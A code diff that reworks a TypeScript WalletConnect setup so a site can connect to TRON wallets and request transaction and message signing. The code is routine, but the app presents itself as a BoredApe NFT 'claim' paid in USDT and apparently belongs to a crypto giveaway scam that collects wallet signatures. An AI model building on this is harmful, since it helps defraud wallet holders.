@@ -1,48 +1,41 @@
-// WalletConnect configuration for Tron
-import type { WalletConnectModal } from "@walletconnect/modal";
+import { UniversalProvider } from "@walletconnect/universal-provider";
+// Use Reown's updated modal if you want better UI (optional migration)
+import { WalletConnectModal } from "@walletconnect/modal"; // or migrate to Reown components later
 
 export const PROJECT_ID = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || "";
 
-let provider: any = null;
+let provider: InstanceType<typeof UniversalProvider> | null = null;
 let modal: WalletConnectModal | null = null;
 
 export async function initWalletConnect() {
   if (provider) return provider;
 
-  if (typeof window === "undefined") {
-    throw new Error("WalletConnect can only be initialized in the browser.");
-  }
+  if (typeof window === "undefined") throw new Error("Browser only");
 
-  if (!PROJECT_ID) {
-    throw new Error("Missing NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID.");
-  }
+  if (!PROJECT_ID) throw new Error("Missing PROJECT_ID");
 
-  const { default: UniversalProvider } = await import("@walletconnect/universal-provider");
   provider = await UniversalProvider.init({
     projectId: PROJECT_ID,
     metadata: {
       name: "Ape NFT Claim",
       description: "Claim your exclusive BoredApe NFT with USDT",
-      url: typeof window !== "undefined" ? window.location.origin : "http://empowerwealthpartners.com/",
+      url: window.location.origin,
       icons: ["https://avatars.githubusercontent.com/u/37784886"],
     },
-    relayUrl: "wss://relay.walletconnect.com",
+    relayUrl: "wss://relay.walletconnect.com", // or Reown's relay if preferred
   });
 
-  // Initialize modal
+  // Optional: Use Reown's modal styling/theme if migrating partially
   if (!modal) {
-    const { WalletConnectModal } = await import("@walletconnect/modal");
     modal = new WalletConnectModal({
       projectId: PROJECT_ID,
-      chains: ["tron:0x2b6653dc"],
+      // No need for chains here — handled in connect()
       themeMode: "dark",
-      themeVariables: {
-        "--wcm-z-index": "9999"
-      },
+      themeVariables: { "--wcm-z-index": "9999" },
       explorerRecommendedWalletIds: [
-        "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0","8a9b2f7c6d4e1a3b5c9d0f8e7b6a4d1c3e9f2a8b5c7d6e4f1a" // Trust Wallet
+        "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0", // Trust Wallet example
+        // Add more TRON-supporting wallets
       ],
-      enableExplorer: true,
     });
   }
 
@@ -52,31 +45,36 @@ export async function initWalletConnect() {
 export async function connectWalletConnect() {
   const wcProvider = await initWalletConnect();
 
-  // Show modal
   modal?.openModal();
 
-  // IMPORTANT: use REQUIRED namespaces
-  await wcProvider.connect({
-    requiredNamespaces: {
+  const session = await wcProvider.connect({
+    optionalNamespaces: {
       tron: {
-        chains: ["tron:mainnet"], // use string, not hex
+        chains: ["tron:0x2b6653dc"], // Correct CAIP-2 for TRON Mainnet
         methods: [
           "tron_signTransaction",
           "tron_signMessage",
           "tron_signMessageV2",
+          // Add "personal_sign" or others if your wallets need them
         ],
-        events: [],
+        events: ["chainChanged", "accountsChanged"], // Optional but useful
       },
     },
   });
 
-  // IMPORTANT: wait for user approval
-  await wcProvider.enable();
-
+  // No .enable() needed — connect() waits for approval
   modal?.closeModal();
 
-  // Sanity check (optional but recommended)
-  console.log("WC session:", wcProvider.session?.namespaces?.tron);
+  if (!session) throw new Error("Failed to connect wallet");
+
+  console.log("Connected TRON session:", session.namespaces.tron);
+
+  // To sign (example usage later in your app):
+  // const result = await wcProvider.request({
+  //   chainId: "tron:0x2b6653dc",
+  //   topic: session.topic,
+  //   request: { method: "tron_signTransaction", params: [tx] }
+  // });
 
   return wcProvider;
 }
